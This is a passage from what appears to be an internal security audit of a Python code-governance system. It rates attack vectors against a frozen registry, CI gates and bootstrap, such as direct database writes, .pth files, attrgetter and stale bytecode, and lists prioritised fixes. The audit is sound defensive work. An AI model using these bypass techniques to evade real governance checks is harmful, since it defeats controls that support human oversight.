| 5.1 | Direct DB write | All | psql bypasses entire Python governance layer |

### MEDIUM (4)

| # | Attack | Target | Vector |
|---|--------|--------|--------|
| 1.1 | _entries access | FrozenRegistry | Populators can access _entries dict directly |
| 3.4 | .pth / sitecustomize | CI gates | Non-.py files not scanned |
| 3.5 | operator.attrgetter | CI gates | Unchecked stdlib functions that do getattr |
| 5.4 | Stale .pyc | CI gates | Pre-governance bytecode survives |

### LOW (3)

| # | Attack | Target | Vector |
|---|--------|--------|--------|
| 1.2 | __dict__ read | FrozenRegistry | Read-only access (no mutation) |
| 1.7 | copy/pickle | FrozenRegistry | Clone for read access |
| 5.2 | Env injection | Bootstrap | Peer shunning correctly detects |
| 5.3 | Hot-patching | Runtime | Requires container root (game over anyway) |

---

## Recommended Priority Fixes

### P0 — Close immediately

1. **Add CI gate: `os._exit` reassignment** — Flag any assignment to `os._exit` or `os.exit`. Add bootstrap-time identity check: `assert os._exit is not None and type(os._exit).__name__ == 'builtin_function_or_method'`.

2. **Restrict `test_*` / `conftest.py` exemption to test directories only** — Change `_is_fully_exempt` to require the file path contains `/tests/` or `/test/`.

3. **Make lineage columns NOT NULL** — Migration: `ALTER TABLE opportunities ALTER COLUMN runtime_graph_seal SET NOT NULL DEFAULT 'UNSET';` (with backfill of existing rows). Remove or restrict `PersistenceClient` to read-only operations.

### P1 — Close this sprint

4. **Make `FROZEN_BYPASS_SETATTR` and `META_PATH_ACCESS` non-exemptible** — Move them to the same category as `DYNAMIC_CODE_EXEC`.

5. **Add EXEMPT validation** — Require ticket numbers or approved reason codes. Count and cap EXEMPT usage.

6. **Delete `_entries` after freeze** — In `_freeze()`, add `del self.__dict__['_entries']` after promoting entries.

7. **Verify `os._exit` integrity at bootstrap** — Before first use, check it hasn't been replaced.

### P2 — Close this quarter

8. **Add `operator.attrgetter` and `functools.reduce(getattr)` to CI gates**
9. **Add `__slots__` to FrozenRegistry** (breaking change, requires careful migration)
10. **Post-bootstrap verification pass** — Scan all loaded modules for cross-boundary references
11. **DB triggers for lineage enforcement** as defence-in-depth
